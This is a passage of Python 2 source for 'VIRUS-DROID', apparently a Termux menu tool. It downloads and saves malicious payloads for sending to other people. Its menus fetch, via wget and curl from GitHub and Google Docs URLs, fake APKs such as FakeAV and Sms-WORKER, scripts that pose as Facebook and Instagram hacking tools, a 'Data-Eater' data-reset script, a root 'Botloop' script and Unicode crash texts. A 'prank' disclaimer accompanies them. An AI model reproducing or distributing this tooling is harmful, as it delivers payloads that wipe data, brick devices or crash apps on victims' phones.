                                                                                print '\x1b[41mSUCCESS\x1b[00m'
                                                                                slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                                                                                print ''
                                                                                b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                                                if b == '1' in b:
                                                                                    app()
                                                                                if b == '2' in b:
                                                                                    exit()
                                                                        else:
                                                                            if pilapp == '18' in pilapp:
                                                                                a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
                                                                                if a == '1' in a:
                                                                                    slowprint('Please wait for a few minutes ...')
                                                                                    os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/Fake-CMCC.apk;mv Fake-CMCC.apk /sdcard')
                                                                                    print '\x1b[41mSUCCESS\x1b[00m'
                                                                                    slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                                                                                    print ''
                                                                                    b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                                                    if b == '1' in b:
                                                                                        app()
                                                                                    if b == '2' in b:
                                                                                        exit()
                                                                                if a == '2' in a:
                                                                                    slowprint('Please wait for a few minutes ...')
                                                                                    os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/Fake-CMCC.apk;mv Fake-CMCC.apk /$HOME')
                                                                                    print '\x1b[41mSUCCESS\x1b[00m'
                                                                                    slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                                                                                    print ''
                                                                                    b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                                                    if b == '1' in b:
                                                                                        app()
                                                                                    if b == '2' in b:
                                                                                        exit()
                                                                            else:
                                                                                if pilapp == '19' in pilapp:
                                                                                    a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
                                                                                    if a == '1' in a:
                                                                                        slowprint('Please wait for a few minutes ...')
                                                                                        os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/Fake-OP.apk;mv Fake-OP.apk /sdcard')
                                                                                        print '\x1b[41mSUCCESS\x1b[00m'
                                                                                        slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                                                                                        print ''
                                                                                        b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                                                        if b == '1' in b:
                                                                                            app()
                                                                                        if b == '2' in b:
                                                                                            exit()
                                                                                    if a == '2' in a:
                                                                                        slowprint('Please wait for a few minutes ...')
                                                                                        os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/Fake-OP.apk;mv Fake-OP.apk /$HOME')
                                                                                        print '\x1b[41mSUCCESS\x1b[00m'
                                                                                        slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                                                                                        print ''
                                                                                        b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                                                        if b == '1' in b:
                                                                                            app()
                                                                                        if b == '2' in b:
                                                                                            exit()
                                                                                else:
                                                                                    if pilapp == '20' in pilapp:
                                                                                        a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
                                                                                        if a == '1' in a:
                                                                                            slowprint('Please wait for a few minutes ...')
                                                                                            os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/Fake-Valid.apk;mv Fake-Valid.apk /sdcard')
                                                                                            print '\x1b[41mSUCCESS\x1b[00m'
                                                                                            slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                                                                                            print ''
                                                                                            b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                                                            if b == '1' in b:
                                                                                                app()
                                                                                            if b == '2' in b:
                                                                                                exit()
                                                                                        if a == '2' in a:
                                                                                            slowprint('Please wait for a few minutes ...')
                                                                                            os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/Fake-Valid.apk;mv Fake-Valid.apk /$HOME')
                                                                                            print '\x1b[41mSUCCESS\x1b[00m'
                                                                                            slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                                                                                            print ''
                                                                                            b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                                                            if b == '1' in b:
                                                                                                app()
                                                                                            if b == '2' in b:
                                                                                                exit()
                                                                                    else:
                                                                                        if pilapp == '21' in pilapp:
                                                                                            a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
                                                                                            if a == '1' in a:
                                                                                                slowprint('Please wait for a few minutes ...')
                                                                                                os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/FakeAV.apk;mv FakeAV.apk /sdcard')
                                                                                                print '\x1b[41mSUCCESS\x1b[00m'
                                                                                                slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                                                                                                print ''
                                                                                                b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                                                                if b == '1' in b:
                                                                                                    app()
                                                                                                if b == '2' in b:
                                                                                                    exit()
                                                                                            if a == '2' in a:
                                                                                                slowprint('Please wait for a few minutes ...')
                                                                                                os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/FakeAV.apk;mv FakeAV.apk /$HOME')
                                                                                                print '\x1b[41mSUCCESS\x1b[00m'
                                                                                                slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                                                                                                print ''
                                                                                                b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                                                                if b == '1' in b:
                                                                                                    app()
                                                                                                if b == '2' in b:
                                                                                                    exit()
                                                                                        else:
                                                                                            if pilapp == '22' in pilapp:
                                                                                                a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
                                                                                                if a == '1' in a:
                                                                                                    slowprint('Please wait for a few minutes ...')
                                                                                                    os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/Image-PETS.apk;mv Image-PETS.apk /sdcard')
                                                                                                    print '\x1b[41mSUCCESS\x1b[00m'
                                                                                                    slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                                                                                                    print ''
                                                                                                    b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                                                                    if b == '1' in b:
                                                                                                        app()
                                                                                                    if b == '2' in b:
                                                                                                        exit()
                                                                                                if a == '2' in a:
                                                                                                    slowprint('Please wait for a few minutes ...')
                                                                                                    os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/Image-PETS.apk;mv Image-PETS.apk /$HOME')
                                                                                                    print '\x1b[41mSUCCESS\x1b[00m'
                                                                                                    slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                                                                                                    print ''
                                                                                                    b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                                                                    if b == '1' in b:
                                                                                                        app()
                                                                                                    if b == '2' in b:
                                                                                                        exit()
                                                                                            else:
                                                                                                if pilapp == '23' in pilapp:
                                                                                                    a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
                                                                                                    if a == '1' in a:
                                                                                                        slowprint('Please wait for a few minutes ...')
                                                                                                        os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/Laugther.apk;mv Laugther.apk /sdcard')
                                                                                                        print '\x1b[41mSUCCESS\x1b[00m'
                                                                                                        slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                                                                                                        print ''
                                                                                                        b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                                                                        if b == '1' in b:
                                                                                                            app()
                                                                                                        if b == '2' in b:
                                                                                                            exit()
                                                                                                    if a == '2' in a:
                                                                                                        slowprint('Please wait for a few minutes ...')
                                                                                                        os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/Laugther.apk;mv Laugther.apk /$HOME')
                                                                                                        print '\x1b[41mSUCCESS\x1b[00m'
                                                                                                        slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                                                                                                        print ''
                                                                                                        b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                                                                        if b == '1' in b:
                                                                                                            app()
                                                                                                        if b == '2' in b:
                                                                                                            exit()
                                                                                                else:
                                                                                                    if pilapp == '24' in pilapp:
                                                                                                        a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
                                                                                                        if a == '1' in a:
                                                                                                            slowprint('Please wait for a few minutes ...')
                                                                                                            os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/OMYGOD.apk;mv OMYGOD.apk /sdcard')
                                                                                                            print '\x1b[41mSUCCESS\x1b[00m'
                                                                                                            slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                                                                                                            print ''
                                                                                                            b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                                                                            if b == '1' in b:
                                                                                                                app()
                                                                                                            if b == '2' in b:
                                                                                                                exit()
                                                                                                        if a == '2' in a:
                                                                                                            slowprint('Please wait for a few minutes ...')
                                                                                                            os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/OMYGOD.apk;mv OMYGOD.apk /$HOME')
                                                                                                            print '\x1b[41mSUCCESS\x1b[00m'
                                                                                                            slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                                                                                                            print ''
                                                                                                            b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                                                                            if b == '1' in b:
                                                                                                                app()
                                                                                                            if b == '2' in b:
                                                                                                                exit()
                                                                                                    else:
                                                                                                        if pilapp == '25' in pilapp:
                                                                                                            a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
                                                                                                            if a == '1' in a:
                                                                                                                slowprint('Please wait for a few minutes ...')
                                                                                                                os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/Sms-WORKER.apk;mv Sms-WORKER.apk /sdcard')
                                                                                                                print '\x1b[41mSUCCESS\x1b[00m'
                                                                                                                slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                                                                                                                print ''
                                                                                                                b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                                                                                if b == '1' in b:
                                                                                                                    app()
                                                                                                                if b == '2' in b:
                                                                                                                    exit()
                                                                                                            if a == '2' in a:
                                                                                                                slowprint('Please wait for a few minutes ...')
                                                                                                                os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/Sms-WORKER.apk;mv Sms-WORKER.apk /$HOME')
                                                                                                                print '\x1b[41mSUCCESS\x1b[00m'
                                                                                                                slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                                                                                                                print ''
                                                                                                                b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                                                                                if b == '1' in b:
                                                                                                                    app()
                                                                                                                if b == '2' in b:
                                                                                                                    exit()
                                                                                                        else:
                                                                                                            if pilapp == '99' in pilapp:
                                                                                                                main()
                                                                                                            else:
                                                                                                                app()


def python():
    os.system('clear')
    slowprint(logo)
    slowprint('VIRUS FILE PYTHON')
    slowprint('After you creating Python Virus please check your connections')
    slowprint('Your termux must have a permissions to storage for save to /sdcard')
    print ''
    print ' FILE NAME                           Description'
    print '--------------------                 -----------'
    print ' \x1b[1;33m1.\x1b[00m Fake-HackFB\x1b[1;91m                     Termux Error'
    print ' \x1b[1;33m2.\x1b[00m Fake-HackIG\x1b[1;91m                     Termux Blank'
    print ' \x1b[1;33m3.\x1b[00m Fake-Tools \x1b[41mPRO\x1b[00m\x1b[1;91m                   Coming Soon'
    print ' \x1b[1;33m4.\x1b[00m Logger\x1b[1;91m                           Coming Soon'
    print ' \x1b[1;33m5.\x1b[00m Backdoor\x1b[1;91m                         Coming soon'
    print ' \x1b[1;33m0. Back\x1b[00m'
    print ''
    print 'Dont use this tools for criminal actions!'
    print 'Just for fun & prank your friends or Termux User'
    print ''
    pilpy = raw_input('Virus\xc2\xaeDroid > ')
    if pilpy == '':
        python()
    else:
        if pilpy == '1' in pilpy:
            a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
            if a == '1' in a:
                slowprint('Please wait for a few minutes ...')
                os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/darkfb.py;mv darkfb.py /sdcard')
                print '\x1b[41mSUCCESS\x1b[00m'
                slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                print ''
                b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                if b == '1' in b:
                    python()
                if b == '2' in b:
                    exit()
            if a == '2' in a:
                slowprint('Please wait for a few minutes ...')
                os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/darkfb.py;mv darkfb.py /$HOME')
                print '\x1b[41mSUCCESS\x1b[00m'
                slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                print ''
                b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                if b == '1' in b:
                    python()
                if b == '2' in b:
                    exit()
        else:
            if pilpy == '2' in pilpy:
                a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
                if a == '1' in a:
                    slowprint('Please wait for a few minutes ...')
                    os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/Hack-IG.py;mv Hack-IG.py /sdcard')
                    print '\x1b[41mSUCCESS\x1b[00m'
                    slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                    print ''
                    b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                    if b == '1' in b:
                        python()
                    if b == '2' in b:
                        exit()
                if a == '2' in a:
                    slowprint('Please wait for a few minutes ...')
                    os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/Hack-IG.py;mv Hack-IG.py /$HOME')
                    print '\x1b[41mSUCCESS\x1b[00m'
                    slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                    print ''
                    b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                    if b == '1' in b:
                        python()
                    if b == '2' in b:
                        exit()
            else:
                if pilpy == '3' in pilpy:
                    slowprint('\x1b[41mCOMING SOON\x1b[00m Next update !')
                    a = raw_input('[ENTER] Back > ')
                    python()
                else:
                    if pilpy == '4' in pilpy:
                        slowprint('\x1b[41mCOMING SOON\x1b[00m Next update !')
                        a = raw_input('[ENTER] Back > ')
                        python()
                    else:
                        if pilpy == '5' in pilpy:
                            slowprint('\x1b[41mCOMING SOON\x1b[00m Next update !')
                            a = raw_input('[ENTER] Back > ')
                            python()
                        else:
                            if pilpy == '0' in pilpy:
                                main()
                            else:
                                python()


def bash():
    os.system('clear')
    slowprint(logo)
    slowprint('VIRUS FILE BASH/SHELL')
    slowprint('After you creating Bash Virus please check your connections')
    slowprint('Your termux must have a permissions to storage for save to /sdcard')
    print ''
    print ' FILE NAME                           Description'
    print '--------------------                 -----------'
    print ' \x1b[1;33m1.\x1b[00m Data-Eater\x1b[1;91m                        Reset Data'
    print ' \x1b[1;33m2.\x1b[00m Auto Botloop \x1b[41mROOT\x1b[00m\x1b[1;91m                    Botloop'
    print ' \x1b[1;33m3.\x1b[00m Auto Freeze\x1b[1;91m                      Coming Soon'
    print ' \x1b[1;33m4.\x1b[00m Logger\x1b[1;91m                           Coming Soon'
    print ' \x1b[1;33m5.\x1b[00m Backdoor\x1b[1;91m                         Coming Soon'
    print ' \x1b[1;33m0. Back\x1b[00m'
    print ''
    print 'Dont use this tools for criminal actions!'
    print 'Just for fun & prank your friends or Termux User'
    print ''
    pilbash = raw_input('Virus\xc2\xaeDroid > ')
    if pilbash == '':
        bash()
    else:
        if pilbash == '1' in pilbash:
            a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
            if a == '1' in a:
                slowprint('Please wait for a few minutes ...')
                os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/Data-eater.sh;mv Data-eater.sh /sdcard')
                print '\x1b[41mSUCCESS\x1b[00m'
                slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                print ''
                b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                if b == '1' in b:
                    bash()
                if b == '2' in b:
                    exit()
            if a == '2' in a:
                slowprint('Please wait for a few minutes ...')
                os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/Data-eater.sh;mv Data-eater.sh /$HOME')
                print '\x1b[41mSUCCESS\x1b[00m'
                slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                print ''
                b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                if b == '1' in b:
                    bash()
                if b == '2' in b:
                    exit()
        else:
            if pilbash == '2' in pilbash:
                a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
                if a == '1' in a:
                    slowprint('Please wait for a few minutes ...')
                    os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/Botloop.sh;mv Botloop.sh /sdcard')
                    print '\x1b[41mSUCCESS\x1b[00m'
                    slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                    print ''
                    b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                    if b == '1' in b:
                        bash()
                    if b == '2' in b:
                        exit()
                if a == '2' in a:
                    slowprint('Please wait for a few minutes ...')
                    os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/Botloop.sh;mv Botloop.sh /$HOME')
                    print '\x1b[41mSUCCESS\x1b[00m'
                    slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                    print ''
                    b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                    if b == '1' in b:
                        bash()
                    if b == '2' in b:
                        exit()
            else:
                if pilbash == '3' in pilbash:
                    slowprint('\x1b[41mCOMING SOON\x1b[00m Next update !')
                    a = raw_input('[ENTER] Back > ')
                    bash()
                else:
                    if pilbash == '4' in pilbash:
                        slowprint('\x1b[41mCOMING SOON\x1b[00m Next update !')
                        a = raw_input('[ENTER] Back > ')
                        bash()
                    else:
                        if pilbash == '5' in pilbash:
                            slowprint('\x1b[41mCOMING SOON\x1b[00m Next update !')
                            a = raw_input('[ENTER] Back > ')
                            bash()
                        else:
                            if pilbash == '0' in pilbash:
                                main()
                            else:
                                bash()


def virtex():
    os.system('clear')
    slowprint(logo)
    slowprint('VIRUS TEXT UNICODE')
    slowprint('After you creating Virtext please check your connections')
    slowprint('Your termux must have a permissions to storage for save to /sdcard')
    print ''
    print ' FILE NAME                                LEVEL'
    print '--------------------                 -----------'
    print ' \x1b[1;33m1.\x1b[00m Virtext Pending\x1b[1;91m                     Exellent'
    print ' \x1b[1;33m2.\x1b[00m Virtext Ganas-1\x1b[1;91m                         Good'
    print ' \x1b[1;33m3.\x1b[00m Virtext Ganas-2\x1b[1;91m                         Good'
    print ' \x1b[1;33m4.\x1b[00m Virtext Ganas-3\x1b[1;91m                         Good'
    print ' \x1b[1;33m5.\x1b[00m Virtext Dark\x1b[1;91m                            Good'
    print ' \x1b[1;33m6.\x1b[00m Virtext Kontak\x1b[1;91m                          Good'
    print ' \x1b[1;33m7.\x1b[00m Virtext StarBuddy\x1b[1;91m                       Good'
    print ' \x1b[1;33m8.\x1b[00m Virtext Wolf\x1b[1;91m                        Exellent'
    print ' \x1b[1;33m9.\x1b[00m Virtext Coly\x1b[1;91m                        Exellent'
    print '\x1b[1;33m10.\x1b[00m Virtext Indoensia\x1b[1;91m                       Good'
    print '\x1b[1;33m99. Back\x1b[00m'
    print ''
    print 'Dont use this tools for criminal actions!'
    print 'Just for fun & prank your friends or Termux User'
    print ''
    piltex = raw_input('Virus\xc2\xaeDroid > ')
    if piltex == '':
        virtex()
    else:
        if piltex == '1' in piltex:
            a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
            if a == '1' in a:
                slowprint('Please wait for a few minutes ...')
                os.system('wget -S https://doc-00-5s-docs.googleusercontent.com/docs/securesc/ha0ro937gcuc7l7deffksulhg5h7mbp1/rdmrdiuefk33rhd3ifpposmvo4qrm54b/1570687200000/13570898479402528222/\\*/13pRzWatHwifXLpncNteYnMPNMBwwcVIB\\?e\\=download')
                os.system("cat '13pRzWatHwifXLpncNteYnMPNMBwwcVIB?e=download' > /sdcard/V-pending.txt;rm '13pRzWatHwifXLpncNteYnMPNMBwwcVIB?e=download'")
                print '\x1b[41mSUCCESS\x1b[00m'
                slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                print ''
                b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                if b == '1' in b:
                    virtex()
                if b == '2' in b:
                    exit()
            if a == '2' in a:
                slowprint('Please wait for a few minutes ...')
                os.system('wget -S https://doc-00-5s-docs.googleusercontent.com/docs/securesc/ha0ro937gcuc7l7deffksulhg5h7mbp1/rdmrdiuefk33rhd3ifpposmvo4qrm54b/1570687200000/13570898479402528222/\\*/13pRzWatHwifXLpncNteYnMPNMBwwcVIB\\?e\\=download')
                os.system("cat '13pRzWatHwifXLpncNteYnMPNMBwwcVIB?e=download' > /$HOME/V-pending.txt;rm '13pRzWatHwifXLpncNteYnMPNMBwwcVIB?e=download'")
                print '\x1b[41mSUCCESS\x1b[00m'
                slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                print ''
                b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                if b == '1' in b:
                    virtex()
                if b == '2' in b:
                    exit()
        else:
            if piltex == '2' in piltex:
                a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
                if a == '1' in a:
                    slowprint('Please wait for a few minutes ...')
                    os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/V-ganas1.txt;mv V-ganas1.txt /sdcard')
                    print '\x1b[41mSUCCESS\x1b[00m'
                    slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                    print ''
                    b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                    if b == '1' in b:
                        virtex()
                    if b == '2' in b:
                        exit()
                if a == '2' in a:
                    slowprint('Please wait for a few minutes ...')
                    os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/V-ganas1.txt;mv V-ganas1.txt /$HOME')
                    print '\x1b[41mSUCCESS\x1b[00m'
                    slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                    print ''
                    b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                    if b == '1' in b:
                        virtex()
                    if b == '2' in b:
                        exit()
            else:
                if piltex == '3' in piltex:
                    a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
                    if a == '1' in a:
                        slowprint('Please wait for a few minutes ...')
                        os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/V-ganas2.txt;mv V-ganas2.txt /sdcard')
                        print '\x1b[41mSUCCESS\x1b[00m'
                        slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                        print ''
                        b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                        if b == '1' in b:
                            virtex()
                        if b == '2' in b:
                            exit()
                    if a == '2' in a:
                        slowprint('Please wait for a few minutes ...')
                        os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/V-ganas2.txt;mv V-ganas2.txt /$HOME')
                        print '\x1b[41mSUCCESS\x1b[00m'
                        slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                        print ''
                        b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                        if b == '1' in b:
                            virtex()
                        if b == '2' in b:
                            exit()
                else:
                    if piltex == '4' in piltex:
                        a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
                        if a == '1' in a:
                            slowprint('Please wait for a few minutes ...')
                            os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/V-ganas3.txt;mv V-ganas3.txt /sdcard')
                            print '\x1b[41mSUCCESS\x1b[00m'
                            slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                            print ''
                            b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                            if b == '1' in b:
                                virtex()
                            if b == '2' in b:
                                exit()
                        if a == '2' in a:
                            slowprint('Please wait for a few minutes ...')
                            os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/V-ganas3.txt;mv V-ganas3.txt /$HOME')
                            print '\x1b[41mSUCCESS\x1b[00m'
                            slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                            print ''
                            b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                            if b == '1' in b:
                                virtex()
                            if b == '2' in b:
                                exit()
                    else:
                        if piltex == '5' in piltex:
                            a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
                            if a == '1' in a:
                                slowprint('Please wait for a few minutes ...')
                                os.system('curl -o /sdcard/V-Dark.txt https://raw.githubusercontent.com/muhammadfathul/vir/master/V5.txt')
                                print '\x1b[41mSUCCESS\x1b[00m'
                                slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                                print ''
                                b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                if b == '1' in b:
                                    virtex()
                                if b == '2' in b:
                                    exit()
                            if a == '2' in a:
                                slowprint('Please wait for a few minutes ...')
                                os.system('curl -o /$HOME/V-Dark.txt https://raw.githubusercontent.com/muhammadfathul/vir/master/V5.txt')
                                print '\x1b[41mSUCCESS\x1b[00m'
                                slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                                print ''
                                b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                if b == '1' in b:
                                    virtex()
                                if b == '2' in b:
                                    exit()
                        else:
                            if piltex == '6' in piltex:
                                a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
                                if a == '1' in a:
                                    slowprint('Please wait for a few minutes ...')
                                    os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/V-Kontak.txt;mv V-Kontak.txt /sdcard')
                                    print '\x1b[41mSUCCESS\x1b[00m'
                                    slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                                    print ''
                                    b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                    if b == '1' in b:
                                        virtex()
                                    if b == '2' in b:
                                        exit()
                                if a == '2' in a:
                                    slowprint('Please wait for a few minutes ...')
                                    os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/V-Kontak.txt;mv V-Kontak.txt /$HOME')
                                    print '\x1b[41mSUCCESS\x1b[00m'
                                    slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                                    print ''
                                    b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                    if b == '1' in b:
                                        virtex()
                                    if b == '2' in b:
                                        exit()
                            else:
                                if piltex == '7' in piltex:
                                    a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
                                    if a == '1' in a:
                                        slowprint('Please wait for a few minutes ...')
                                        os.system('curl -o /sdcard/V-StarBuddy.txt https://raw.githubusercontent.com/muhammadfathul/vir/master/V7.txt')
                                        print '\x1b[41mSUCCESS\x1b[00m'
                                        slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                                        print ''
                                        b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                        if b == '1' in b:
                                            virtex()
                                        if b == '2' in b:
                                            exit()
                                    if a == '2' in a:
                                        slowprint('Please wait for a few minutes ...')
                                        os.system('curl -o /$HOME/V-StarBuuddy.txt https://raw.githubusercontent.com/muhammadfathul/vir/master/V7.txt')
                                        print '\x1b[41mSUCCESS\x1b[00m'
                                        slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                                        print ''
                                        b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                        if b == '1' in b:
                                            virtex()
                                        if b == '2' in b:
                                            exit()
                                else:
                                    if piltex == '8' in piltex:
                                        a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
                                        if a == '1' in a:
                                            slowprint('Please wait for a few minutes ...')
                                            os.system('curl -o /sdcard/V-Wolf.txt https://raw.githubusercontent.com/muhammadfathul/vir/master/V8.txt')
                                            print '\x1b[41mSUCCESS\x1b[00m'
                                            slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                                            print ''
                                            b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                            if b == '1' in b:
                                                virtex()
                                            if b == '2' in b:
                                                exit()
                                        if a == '2' in a:
                                            slowprint('Please wait for a few minutes ...')
                                            os.system('curl -o /$HOME/V-Wolf.txt https://raw.githubusercontent.com/muhammadfathul/vir/master/V8.txt')
                                            print '\x1b[41mSUCCESS\x1b[00m'
